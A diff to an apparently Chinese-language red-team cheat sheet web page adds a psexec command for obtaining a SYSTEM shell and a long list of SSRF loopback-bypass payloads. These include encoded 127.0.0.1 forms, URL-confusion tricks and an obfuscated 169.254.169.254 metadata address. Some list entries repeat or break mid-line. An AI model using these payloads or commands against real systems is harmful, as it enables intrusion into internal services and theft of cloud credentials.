@@ -87,6 +87,8 @@
           ]},
           {title: "\u67e5\u770bWindows PIPE", url: "#windows-pipe", children: [
           ]},
+          {title: "\u83b7\u53d6system", url: "#system", children: [
+          ]},
           {title: "RDP\u5207\u4f1a\u8bdd", url: "#rdp_4", children: [
           ]},
           {title: "\u6253\u5305\u89e3\u5305", url: "#_10", children: [
@@ -124,6 +126,8 @@
           {title: "\u5f39\u7a97", url: "#_16", children: [
           ]},
           {title: "\u6301\u7eed\u622a\u5c4f", url: "#_17", children: [
+          ]},
+          {title: "Localhost\u53d8\u79cd", url: "#localhost", children: [
           ]},
         ];
 
@@ -691,6 +695,8 @@ powershell -ExecutionPolicy bypass -command &quot;&amp;{import-module C:\Users\P
 <p>远程</p>
 <p><code>auxiliary/scanner/smb/pipe_auditor</code>    msf这个插件需要认证</p>
 <p>rpcdump.py 192.168.14.100 这个不需要认证，可以访问未授权的东西</p>
+<h3 id="system">获取system</h3>
+<p><code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
 <h3 id="rdp_4">RDP切会话</h3>
 <p>前提是有其他用户的会话且是激活的，可以无视其他用户是不是锁屏。</p>
 <p>切换到system</p>
@@ -895,6 +901,73 @@ msg %username% /time:1000 XXX集团安全平台提醒您：您的文档疑似感
 <h3 id="_17">持续截屏</h3>
 <p><code>psr.exe /start /gui 0 /output C:\Users\Public\out.zip</code>
 <code>psr.exe /stop</code></p>
+<h3 id="localhost">Localhost变种</h3>
+<pre><code>127.0.0.1:80
+127.0.0.1:443
+127.0.0.1:22
+127.1:80
+0
+0.0.0.0:80
+localhost:80
+[::]:80/
+[::]:25/ SMTP
+[::]:3128/ Squid
+[0000::1]:80/
+[0:0:0:0:0:ffff:127.0.0.1]/thefile
+①②⑦.⓪.⓪.⓪
+127.127.127.127
+127.0.1.3
+127.0.0.0
+2130706433/
+017700000001
+3232235521/
+3232235777/
+0x7f000001/
+0xc0a80014/
+{domain}
+@127
+.0.0.1
+127.0.0.1#{domain}
+{domain}.127.0.0.1
+127.0.0.1/{domain}
+127.0.0.1/?d={domain}
+{domain}
+@127
+.0.0.1
+127.0.0.1#{domain}
+{domain}.127.0.0.1
+127.0.0.1/{domain}
+127.0.0.1/?d={domain}
+{domain}
+@localhost
+
+localhost#{domain}
+{domain}.localhost
+localhost/{domain}
+localhost/?d={domain}
+127.0.0.1%00{domain}
+127.0.0.1?{domain}
+127.0.0.1///{domain}
+127.0.0.1%00{domain}
+127.0.0.1?{domain}
+127.0.0.1///{domain}st:+11211aaa
+st:00011211aaaa
+1.1.1.1 &amp;@2.2.2.2# 
+@3
+.3.3.3/
+127.1.1.1:80\@
+@127
+.2.2.2:80/.
+127.1.1.1:80#\
+@127
+.2.2.2:80/
+
+Enclosed Alphanumeric Bypasses :
+
+http:// 169.254.169.254/%0A
+http:// %E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94:80/
+
+</code></pre>
 
   <br>
     
